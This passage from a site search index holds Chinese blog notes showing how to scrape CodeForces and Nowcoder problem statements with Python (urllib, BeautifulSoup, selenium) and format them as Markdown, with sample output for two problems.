urllib.request \u548c BeautifulSoup4 \u5e93\u5bf9\u9898\u76ee\u4fe1\u606f\u8fdb\u884c\u4e86\u722c\u53d6\uff0c\u5199\u9898\u89e3\u7684\u65f6\u5019\u65f6\u95f4\u8282\u7ea6\u4e86\u5f88\u591a\u3002 \u8003\u8651\u5230\u5927\u5bb6\u53ef\u80fd\u4e5f\u4f1a\u9047\u5230\u540c\u6837\u7684\u95ee\u9898\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u5206\u4eab\u7ed9\u5927\u5bb6\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#2","text":"\u5b89\u88c5 urllib \u548c BeautifulSoup \u5e93\u3002 pip3 install urllib pip3 install beautifulsoup4","title":"2. \u524d\u671f\u51c6\u5907"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#3","text":"\u4ee5 CodeForces 1353 B. Two Arrays And Swaps \u4e3a\u4f8b\u3002 # \u5bfc\u5165\u5e93 import urllib.request import bs4 from bs4 import BeautifulSoup # \u9898\u76ee\u5c5e\u6027 problemSet = \"1353\" problemId = \"B\" # \u9898\u76ee\u94fe\u63a5 url = f\"https://codeforces.com/problemset/problem/{problemSet}/{problemId}\" # \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 html = urllib.request.urlopen(url).read() # \u683c\u5f0f\u5316 soup = BeautifulSoup(html,'lxml') # \u5b58\u50a8 data_dict = {} # \u627e\u5230\u4e3b\u4f53\u5185\u5bb9 mainContent = soup.find_all(name=\"div\", attrs={\"class\" :\"problem-statement\"})[0]","title":"3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#4","text":"","title":"4. \u5185\u5bb9\u5904\u7406"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#41-limit","text":"\u5148\u4ece\u6bd4\u8f83\u7b80\u5355\u7684\u4fe1\u606f\u5165\u624b\uff0c\u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236\u3002 # Limit # \u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236 # Title data_dict['Title'] = f\"CodeForces {problemSet} \" + mainContent.find_all(name=\"div\", attrs={\"class\":\"title\"})[0].contents[-1] # Time Limit data_dict['Time Limit'] = mainContent.find_all(name=\"div\", attrs={\"class\":\"time-limit\"})[0].contents[-1] # Memory Limit data_dict['Memory Limit'] = mainContent.find_all(name=\"div\", attrs={\"class\":\"memory-limit\"})[0].contents[-1] \u5b9a\u4e49\u51fd\u6570\uff0c\u5904\u7406\u4e3b\u4f53\u5185\u5bb9\u4e2d\u8be1\u5f02\u7684\u7a7a\u683c\u548c\u516c\u5f0f\u7684\u4e09\u4e2a\u7f8e\u5143\u7b26\u53f7 $$$ \u3002 def divTextProcess(div): \"\"\" \u5904\u7406<div>\u6807\u7b7e\u4e2d<p>\u7684\u6587\u672c\u5185\u5bb9 \"\"\" strBuffer = '' # \u904d\u5386\u5904\u7406\u6bcf\u4e2a<p>\u6807\u7b7e for each in div.find_all(\"p\"): for content in each.contents: # \u5982\u679c\u4e0d\u662f\u7b2c\u4e00\u4e2a\uff0c\u52a0\u6362\u884c\u7b26 if (strBuffer != ''): strBuffer += '\\n\\n' # \u5904\u7406 if (type(content) != bs4.element.Tag): # \u5982\u679c\u662f\u6587\u672c\uff0c\u6dfb\u52a0\u81f3\u5b57\u7b26\u4e32buffer\u4e2d strBuffer += content.replace(\" \", \" \").replace(\"$$$\", \"$\") else: # \u5982\u679c\u662fhtml\u5143\u7d20\uff0c\u5982span\u7b49\uff0c\u52a0\u4e0a\u7c97\u4f53 strBuffer += \"**\" + content.contents[0].replace(\" \", \" \").replace(\"$$$\", \"$\") + \"**\" # \u8fd4\u56de\u7ed3\u679c return strBuffer","title":"4.1. Limit"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#42-problem-description","text":"\u83b7\u53d6\u9898\u76ee\u63cf\u8ff0\uff0c\u7531\u4e8e\u9898\u76ee\u63cf\u8ff0\u7684 <div> \u6807\u7b7e\u6ca1\u6709 id \u548c class \u5c5e\u6027\uff0c\u8fd9\u91cc\u901a\u8fc7\u627e\u5217\u8868\u4e2d\u7b2c 10 \u4e2a div \u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002 # \u5904\u7406\u9898\u76ee\u63cf\u8ff0 data_dict['Problem Description'] = divTextProcess(mainContent.find_all(\"div\")[10])","title":"4.2. Problem Description"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#43-input","text":"\u8f93\u5165\u63cf\u8ff0 div = mainContent.find_all(name=\"div\", attrs={\"class\":\"input-specification\"})[0] data_dict['Input'] = divTextProcess(div)","title":"4.3. Input"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#44-output","text":"\u8f93\u51fa\u63cf\u8ff0 div = mainContent.find_all(name=\"div\", attrs={\"class\":\"output-specification\"})[0] data_dict['Output'] = divTextProcess(div)","title":"4.4. Output"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#45-sample-input-output","text":"\u8f93\u5165\u6837\u4f8b\uff0c\u7528\u4ee3\u7801\u6846\u73af\u5883\u5305\u56f4\u3002 # Input div = mainContent.find_all(name=\"div\", attrs={\"class\":\"input\"})[0] data_dict['Sample Input'] = \"```cpp\" + div.find_all(\"pre\")[0].contents[0] + '```' # Onput div = mainContent.find_all(name=\"div\", attrs={\"class\":\"output\"})[0] data_dict['Sample Output'] = \"```cpp\" + div.find_all(\"pre\")[0].contents[0] + '```'","title":"4.5. Sample Input &amp; Output"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#46-note","text":"\u6837\u4f8b\u8bf4\u660e div = mainContent.find_all(name=\"div\", attrs={\"class\":\"note\"})[0] data_dict['Note'] = divTextProcess(div)","title":"4.6. Note"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#47-source","text":"\u9898\u76ee\u94fe\u63a5 data_dict['Source'] = '[' + data_dict['Title'] + ']' + '(' + url + ')'","title":"4.7. Source"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#5","text":"for each in data_dict.keys(): print('### ' + each + '\\n') print(data_dict[each].replace(\"\\n\\n**\", \"**\").replace(\"**\\n\\n\", \"**\") + '\\n') \u4e0b\u9762\u662f\u6700\u540e\u7684\u8f93\u51fa\u7ed3\u679c ### Title CodeForces 1353 B. Two Arrays And Swaps ### Time Limit 1 second ### Memory Limit 256 megabytes ### Problem Description You are given two arrays $a$ and $b$ both consisting of $n$ positive (greater than zero) integers. You are also given an integer $k$. In one move, you can choose two indices $i$ and $j$ ($1 \\le i, j \\le n$) and swap $a_i$ and $b_j$ (i.e. $a_i$ becomes $b_j$ and vice versa). Note that $i$ and $j$ can be equal or different (in particular, swap $a_2$ with $b_2$ or swap $a_3$ and $b_9$ both are acceptable moves). Your task is to find the **maximum** possible sum you can obtain in the array $a$ if you can do no more than (i.e. at most) $k$ such moves (swaps). You have to answer $t$ independent test cases. ### Input The first line of the input contains one integer $t$ ($1 \\le t \\le 200$) \u2014 the number of test cases. Then $t$ test cases follow. The first line of the test case contains two integers $n$ and $k$ ($1 \\le n \\le 30; 0 \\le k \\le n$) \u2014 the number of elements in $a$ and $b$ and the maximum number of moves you can do. The second line of the test case contains $n$ integers $a_1, a_2, \\dots, a_n$ ($1 \\le a_i \\le 30$), where $a_i$ is the $i$-th element of $a$. The third line of the test case contains $n$ integers $b_1, b_2, \\dots, b_n$ ($1 \\le b_i \\le 30$), where $b_i$ is the $i$-th element of $b$. ### Output For each test case, print the answer \u2014 the **maximum** possible sum you can obtain in the array $a$ if you can do no more than (i.e. at most) $k$ swaps. ### Sample Input // \u8fd9\u91cc\u4f1a\u6709```cpp\u4ee3\u7801\u73af\u5883\uff0c\u5728\u8fd9\u91cc\u4e3a\u4e86\u5c55\u793a\u65b9\u4fbf\u53bb\u6389\u4e86 5 2 1 1 2 3 4 5 5 5 5 6 6 5 1 2 5 4 3 5 3 1 2 3 4 5 10 9 10 10 9 4 0 2 2 4 3 2 4 2 3 4 4 1 2 2 1 4 4 5 4 ### Sample Output 6 27 39 11 17 ### Note In the first test case of the example, you can swap $a_1 = 1$ and $b_2 = 4$, so $a=[4, 2]$ and $b=[3, 1]$. In the second test case of the example, you don't need to swap anything. In the third test case of the example, you can swap $a_1 = 1$ and $b_1 = 10$, $a_3 = 3$ and $b_3 = 10$ and $a_2 = 2$ and $b_4 = 10$, so $a=[10, 10, 10, 4, 5]$ and $b=[1, 9, 3, 2, 9]$. In the fourth test case of the example, you cannot swap anything. In the fifth test case of the example, you can swap arrays $a$ and $b$, so $a=[4, 4, 5, 4]$ and $b=[1, 2, 2, 1]$. ### Source [CodeForces 1353 B. Two Arrays And Swaps](https://codeforces.com/problemset/problem/1353/B) \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u8f93\u51fa"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/","text":"Python\u722c\u53d6\u725b\u5ba2\u7f51\u9898\u76ee # \u76ee\u5f55 # Python\u722c\u53d6\u725b\u5ba2\u7f51\u9898\u76ee \u76ee\u5f55 1. \u80cc\u666f 2. \u524d\u671f\u51c6\u5907 3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 4. \u5185\u5bb9\u5904\u7406 4.1. Limit 4.2. Problem Description 4.3. Input 4.4. Output 4.5. Sample Input & Output 4.6. Note 4.7. Source 5. \u8f93\u51fa 1. \u80cc\u666f # \u6700\u8fd1\u505a\u9898\u7684\u65f6\u5019\u8981\u5199\u4e00\u4e9b\u9898\u89e3\uff0c\u5728\u628a \u725b\u5ba2\u7f51 \u7684\u9898\u76ee\u590d\u5236\u4e0b\u6765\u7684\u65f6\u5019\uff0c\u6570\u5b66\u516c\u5f0f\u7684\u5904\u7406\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6240\u4ee5\u6211\u7528 Python \u7684 selenium \u3001 urllib.request \u548c BeautifulSoup4 \u5e93\u5bf9\u9898\u76ee\u4fe1\u606f\u8fdb\u884c\u4e86\u722c\u53d6\uff0c\u5199\u9898\u89e3\u7684\u65f6\u5019\u65f6\u95f4\u8282\u7ea6\u4e86\u5f88\u591a\u3002 \u8003\u8651\u5230\u5927\u5bb6\u53ef\u80fd\u4e5f\u4f1a\u9047\u5230\u540c\u6837\u7684\u95ee\u9898\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u5206\u4eab\u7ed9\u5927\u5bb6\u3002 2. \u524d\u671f\u51c6\u5907 # \u5b89\u88c5 selenium \u3001 urllib \u548c BeautifulSoup \u5e93\u3002 pip3 install urllib pip3 install selenium pip3 install beautifulsoup4 3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 # \u4ee5 \u725b\u5ba2\u7f51 NC204552 \u54aa\u54aa\u6e38\u620f \u4e3a\u4f8b\u3002 # \u5bfc\u5165\u5e93 import urllib.request import bs4 import time from bs4 import BeautifulSoup from selenium import webdriver # \u9898\u76ee\u5c5e\u6027 problemId = \"204552\" # \u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u6a21\u62df\u767b\u9646 # \u6b64\u5904\u7528\u7684\u662fChrome\uff0c\u5982\u679c\u6ca1\u6709\u5b89\u88c5\u53ef\u4ee5\u66ff\u6362\u4e3a\u5176\u4ed6\u652f\u6301\u7684\u6d4f\u89c8\u5668 driver = webdriver.Chrome() \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 # \u83b7\u53d6\u9875\u9762\u5185\u5bb9 # \u9898\u76ee\u94fe\u63a5 url = f\"https://ac.nowcoder.com/acm/problem/{problemId}\" # \u6253\u5f00\u7f51\u9875 driver.get(url) # \u7f51\u9875\u52a0\u8f7d\u7b49\u5f85\u65f6\u95f4 time.sleep(3) # \u627e\u5230 \u8f93\u5165 \u7528\u6237\u540d \u548c\u5bc6\u7801\u6846\uff0c\u5e76\u4e14\u8bbe\u7f6e\u5185\u5bb9 username = driver.find_element_by_id('jsEmailIpt') # \u8f93\u5165\u8d26\u53f7\u540d\uff0cxxx\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u8d26\u6237\u540d username.send_keys('xxx') time.sleep(1) password = driver.find_element_by_id('jsPasswordIpt') #\u8f93\u5165\u5bc6\u7801\uff0cxxx\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u5bc6\u7801 password.send_keys('xxx') time.sleep(1) # \u5206\u6790\u7f51\u9875\uff0c\u627e\u5230\u767b\u5f55\u6309\u94ae login = driver.find_elements_by_css_selector('div[class=col-input-login] a')[0] # \u70b9\u51fb\u6309\u94ae login.click() time.sleep(3) # \u683c\u5f0f\u5316\u6e90\u4ee3\u7801 soup = BeautifulSoup(driver.page_source,'lxml') # \u9000\u51fa\u6d4f\u89c8\u5668 driver.quit() \u5b58\u50a8\u548c\u9884\u5904\u7406 # \u5b58\u50a8 data_dict = {} # \u627e\u5230\u4e3b\u4f53\u5185\u5bb9 mainContent = soup.find_all(name=\"div\", attrs={\"class\" :\"terminal-topic\"})[0] # \u53bb\u9664\u516c\u5f0f\u7684\u91cd\u590dhtml\u5143\u7d20 for each in mainContent.find_all('mrow'): each.decompose() for each in mainContent.find_all(name=\"span\", attrs={\"class\" :\"katex-html\"}): each.decompose() # \u66f4\u6362\u6362\u884c\u7b26 for each in mainContent.find_all('br'): each.replace_with(\"\\n\\n\") 4. \u5185\u5bb9\u5904\u7406 # 4.1. Limit # \u5148\u4ece\u6bd4\u8f83\u7b80\u5355\u7684\u4fe1\u606f\u5165\u624b\uff0c\u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236\u3002 # Limit # \u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236 div = mainContent.find_all(name=\"div\", attrs={\"class\":\"subject-item-wrap\"})[0].find_all(\"span\") # \u653e\u5165\u5b57\u5178\u4e2d\u5b58\u50a8 data_dict['Title'] = f\"\u725b\u5ba2\u7f51 NC{problemId} \" + soup.title.contents[0] # Time Limit data_dict['Time Limit'] = div[0].contents[0].split('\uff1a')[1] # Memory Limit data_dict['Memory Limit'] = div[1].contents[0].split('\uff1a')[1] \u5b9a\u4e49\u51fd\u6570\uff0c\u5904\u7406\u4e3b\u4f53\u5185\u5bb9\u4e2d\u8be1\u5f02\u7684\u7a7a\u683c\u548c\u516c\u5f0f\u7684\u7b26\u53f7\u3002 def divTextProcess(div): \"\"\" \u5904\u7406<div>\u6807\u7b7e\u4e2d\u7684\u6587\u672c\u5185\u5bb9 \"\"\" # \u83b7\u53d6\u6587\u672c strBuffer = div.get_text() # \u66ff\u6362\u516c\u5f0f\u6807\u8bb0 strBuffer = strBuffer.replace(\"{\", \" $\").replace(\"}\", \"$ \") # \u53bb\u9664\u591a\u4e2a\u7a7a\u683c strBuffer = strBuffer.replace(\" \", \"\") # \u53bb\u9664\u591a\u4e2a\u6362\u884c\u7b26 strBuffer = strBuffer.replace(\"\\n\\n\\n\", \"\\n\") # \u53bb\u9664\u5185\u5bb9\u4e2d\u7528\\xa0\u8868\u793a\u7684\u7a7a\u683c strBuffer = strBuffer.replace(\"\\xa0\", \"\") # \u53bb\u9664\u9996\u4f4d\u7a7a\u683c strBuffer = strBuffer.strip() # \u8fd4\u56de\u7ed3\u679c return strBuffer 4.2. Problem Description # \u83b7\u53d6\u9898\u76ee\u63cf\u8ff0 # \u5904\u7406\u9898\u76ee\u63cf\u8ff0 div = mainContent.find_all(name=\"div\", attrs={\"class\": \"subject-question\"})[0] data_dict['Problem Description'] = divTextProcess(div) 4.3. Input # \u8f93\u5165\u63cf\u8ff0 div = mainContent.find_all(name=\"pre\")[0] data_dict['Input'] = divTextProcess(div) 4.4. Output # \u8f93\u51fa\u63cf\u8ff0 div = mainContent.find_all(name=\"pre\")[1] data_dict['Output'] = divTextProcess(div) 4.5. Sample Input & Output # \u8f93\u5165\u6837\u4f8b\uff0c\u7528\u4ee3\u7801\u6846\u73af\u5883\u5305\u56f4\u3002 # Input div = mainContent.find_all(name=\"div\", attrs={\"class\":\"question-oi-cont\"})[0] data_dict['Sample Input'] = \"```cpp\" + div.get_text() + '```' # Onput div = mainContent.find_all(name=\"div\", attrs={\"class\":\"question-oi-cont\"})[1] data_dict['Sample Output'] = \"```cpp\" + div.get_text() + '```' 4.6. Note # \u5907\u6ce8 # \u82e5\u6709\u5907\u6ce8 if len(mainContent.find_all(name=\"pre\")) >= 5: div = mainContent.find_all(name=\"pre\")[-1] data_dict['Note'] = divTextProcess(div) 4.7. Source # \u9898\u76ee\u94fe\u63a5 data_dict['Source'] = '[' + data_dict['Title'] + ']' + '(' + url + ')' 5. \u8f93\u51fa # for each in data_dict.keys(): print('### ' + each + '\\n') print(data_dict[each].replace(\"\\n\\n**\", \"**\").replace(\"**\\n\\n\", \"**\") + '\\n') \u4e0b\u9762\u662f\u6700\u540e\u7684\u8f93\u51fa\u7ed3\u679c ### Title \u725b\u5ba2\u7f51 NC204552 \u54aa\u54aa\u6e38\u620f ### Time Limit C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 ### Memory Limit C/C++ 524288K\uff0c\u5176\u4ed6\u8bed\u8a001048576K ### Problem Description \u725b\u725b\u6700\u8fd1\u559c\u6b22\u73a9\u54aa\u54aa\u6e38\u620f\uff0c\u4e8e\u662f\u81ea\u5df1\u5199\u4e86\u4e2a\u7a0b\u5e8f\u7f16\u4e86\u4e2a\u6e38\u620f\u8ba9\u725b\u59b9\u6765\u73a9\u3002\u6e38\u620f\u662f\u8fd9\u6837\u7684\uff1a \u725b\u725b\u6709\u4e00\u4e2a\u957f\u7684\u5b57\u7b26\u4e32\uff08\u53ea\u530526\u542b\u4e2a\u5c0f\u5199\u5b57\u6bcd\uff09\uff0c\u4ed6\u60f3\u8ba9\u725b\u59b9\u5224\u65ad\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u597d\u7684\u3002 \u5b9a\u4e49\u4e00\u4e2a\u4e32\u662f\u597d\u7684\uff1a\u8fd9\u4e2a\u4e32\u662f\u7531\u8fde\u7eed\u7684mq\u8fde\u63a5\u800c\u6210\u7684\u3002 \u6bd4\u5982 $mqmq$ \u8bf4\u660e\u8fd9\u4e2a\u4e32\u662f\u597d\u7684\uff0c $mqmqm$ \u6216 $mqmqx$ \u90fd\u662f\u4e0d\u597d\u7684\u3002\u73b0\u5728\u725b\u725b \u60f3\u95ee\u725b\u59b9\u8fd9\u4e2a\u4e32\u662f\u5426\u662f\u597d\u7684\uff0c\u5982\u679c\u597d\u7684\u8f93\u51fa $Yes$ \uff0c\u5426\u5219\u8f93\u51fa $No$ ### Input \u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570Q\uff0c\u8868\u793a\u8be2\u95ee\u6b21\u6570 \u5c31\u4e0b\u6765Q\u884c\uff0c\u4e00\u4e2a\u5b57\u7b26\u4e32$s ### Onput Q\u884c\uff0c\u6bcf\u884c\u8f93\u51fa $Yes$ \u6216 $No$ ### Sample Input // \u8fd9\u91cc\u4f1a\u6709```cpp\u4ee3\u7801\u73af\u5883\uff0c\u5728\u8fd9\u91cc\u4e3a\u4e86\u5c55\u793a\u65b9\u4fbf\u53bb\u6389\u4e86 4 mqmq mqmqm mqakioi mqqmmq ### Sample Output Yes No No No ### Note \u5bf9\u4e8e $60\\%$ \u7684\u6570\u636e\u6ee1\u8db3\uff1a $|s|<=10,Q<=10$ \u4e14\u4fdd\u8bc1\u53ea\u51fa\u73b0m,q\u4e24\u4e2a\u5b57\u7b26 \u5bf9\u4e8e $100\\%$ \u7684\u6570\u636e\uff1a $|s| <=10^5,Q<=10$ \u5bf9\u4e8e\u6240\u6709\u6570\u636e\u4fdd\u8bc1\u53ea\u51fa\u73b026\u4e2a\u82f1\u6587\u5c0f\u5199\u5b57\u6bcd ### Source [\u725b\u5ba2\u7f51 NC204552 \u54aa\u54aa\u6e38\u620f](https://ac.nowcoder.com/acm/problem/204552) \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.Python\u722c\u53d6\u725b\u5ba2\u7f51\u9898\u76ee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#python","text":"","title":"Python\u722c\u53d6\u725b\u5ba2\u7f51\u9898\u76ee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#_1","text":"Python\u722c\u53d6\u725b\u5ba2\u7f51\u9898\u76ee \u76ee\u5f55 1. \u80cc\u666f 2. \u524d\u671f\u51c6\u5907 3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 4. \u5185\u5bb9\u5904\u7406 4.1. Limit 4.2. Problem Description 4.3. Input 4.4. Output 4.5. Sample Input & Output 4.6. Note 4.7. Source 5. \u8f93\u51fa","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#1","text":"\u6700\u8fd1\u505a\u9898\u7684\u65f6\u5019\u8981\u5199\u4e00\u4e9b\u9898\u89e3\uff0c\u5728\u628a \u725b\u5ba2\u7f51 \u7684\u9898\u76ee\u590d\u5236\u4e0b\u6765\u7684\u65f6\u5019\uff0c\u6570\u5b66\u516c\u5f0f\u7684\u5904\u7406\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6240\u4ee5\u6211\u7528 Python \u7684 selenium \u3001 urllib.request \u548c BeautifulSoup4 \u5e93\u5bf9\u9898\u76ee\u4fe1\u606f\u8fdb\u884c\u4e86\u722c\u53d6\uff0c\u5199\u9898\u89e3\u7684\u65f6\u5019\u65f6\u95f4\u8282\u7ea6\u4e86\u5f88\u591a\u3002 \u8003\u8651\u5230\u5927\u5bb6\u53ef\u80fd\u4e5f\u4f1a\u9047\u5230\u540c\u6837\u7684\u95ee\u9898\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u5206\u4eab\u7ed9\u5927\u5bb6\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#2","text":"\u5b89\u88c5 selenium \u3001 urllib \u548c BeautifulSoup \u5e93\u3002 pip3 install urllib pip3 install selenium pip3 install beautifulsoup4","title":"2. \u524d\u671f\u51c6\u5907"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#3","text":"\u4ee5 \u725b\u5ba2\u7f51 NC204552 \u54aa\u54aa\u6e38\u620f \u4e3a\u4f8b\u3002 # \u5bfc\u5165\u5e93 import urllib.request import bs4 import time from bs4 import BeautifulSoup from selenium import webdriver # \u9898\u76ee\u5c5e\u6027 problemId = \"204552\" # \u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u6a21\u62df\u767b\u9646 # \u6b64\u5904\u7528\u7684\u662fChrome\uff0c\u5982\u679c\u6ca1\u6709\u5b89\u88c5\u53ef\u4ee5\u66ff\u6362\u4e3a\u5176\u4ed6\u652f\u6301\u7684\u6d4f\u89c8\u5668 driver = webdriver.Chrome() \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 # \u83b7\u53d6\u9875\u9762\u5185\u5bb9 # \u9898\u76ee\u94fe\u63a5 url = f\"https://ac.nowcoder.com/acm/problem/{problemId}\" # \u6253\u5f00\u7f51\u9875 driver.get(url) # \u7f51\u9875\u52a0\u8f7d\u7b49\u5f85\u65f6\u95f4 time.sleep(3) # \u627e\u5230 \u8f93\u5165 \u7528\u6237\u540d \u548c\u5bc6\u7801\u6846\uff0c\u5e76\u4e14\u8bbe\u7f6e\u5185\u5bb9 username = driver.find_element_by_id('jsEmailIpt') # \u8f93\u5165\u8d26\u53f7\u540d\uff0cxxx\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u8d26\u6237\u540d username.send_keys('xxx') time.sleep(1) password = driver.find_element_by_id('jsPasswordIpt') #\u8f93\u5165\u5bc6\u7801\uff0cxxx\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u5bc6\u7801 password.send_keys('xxx') time.sleep(1) # \u5206\u6790\u7f51\u9875\uff0c\u627e\u5230\u767b\u5f55\u6309\u94ae login = driver.find_elements_by_css_selector('div[class=col-input-login] a')[0] # \u70b9\u51fb\u6309\u94ae login.click() time.sleep(3) # \u683c\u5f0f\u5316\u6e90\u4ee3\u7801 soup = BeautifulSoup(driver.page_source,'lxml') # \u9000\u51fa\u6d4f\u89c8\u5668 driver.quit() \u5b58\u50a8\u548c\u9884\u5904\u7406 # \u5b58\u50a8 data_dict = {} # \u627e\u5230\u4e3b\u4f53\u5185\u5bb9 mainContent = soup.find_all(name=\"div\", attrs={\"class\" :\"terminal-topic\"})[0] # \u53bb\u9664\u516c\u5f0f\u7684\u91cd\u590dhtml\u5143\u7d20 for each in mainContent.find_all('mrow'): each.decompose() for each in mainContent.find_all(name=\"span\", attrs={\"class\" :\"katex-html\"}): each.decompose() # \u66f4\u6362\u6362\u884c\u7b26 for each in mainContent.find_all('br'): each.replace_with(\"\\n\\n\")","title":"3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#4","text":"","title":"4. 